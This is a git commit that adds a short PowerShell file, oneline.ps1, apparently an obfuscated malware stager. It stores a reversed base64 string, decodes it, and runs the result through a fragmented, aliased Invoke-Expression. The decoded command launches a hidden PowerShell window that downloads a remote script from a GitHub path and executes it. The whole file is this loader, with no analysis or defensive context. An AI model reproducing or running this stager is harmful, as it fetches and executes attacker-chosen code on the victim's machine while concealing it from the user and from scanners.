16f731973ba6f3c3ac5a0828adf0b4fb2dd3301c
cyberforce48 <haroonwattoo465@gmail.com>
2024-09-17 16:12:42 +0500

    Add files via upload

---
+++ oneline.ps1
@@ -0,0 +1,4 @@
+$best64code = "=IyOpcSMzBnLlJXdjV2cv4Wah12L3FmcvMHdjVmavJHcvgDNlNmcvZmclJWej9SbvNmLiVHa0l2Zv8iOzBHd0h2JocmbpJHdTRWYvxmb39GRukCduVWasNkYldlL0VmTgQ3YlpmYP1ydl5EKYVUSiAyQtAiblRGZphEIlxWe0N1dvRmbpdVLgUGel5CbsVGazJXZ39Gc" ;
+$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null ;
+$LoaDcOde = [SySTEM.TexT.encODINg]::UTf8.GetstrInG([syStEM.CONVeRt]::frOmBAsE64sTrING("$bAse64")) ;
+$PWn = "Inv"+"OKE"+"-Ex"+"pRE"+"SSi"+"ON" ; neW-alIaS -NaMe pwN -ValUe $PwN -FoRce ; PWN $LOaDCODe ;
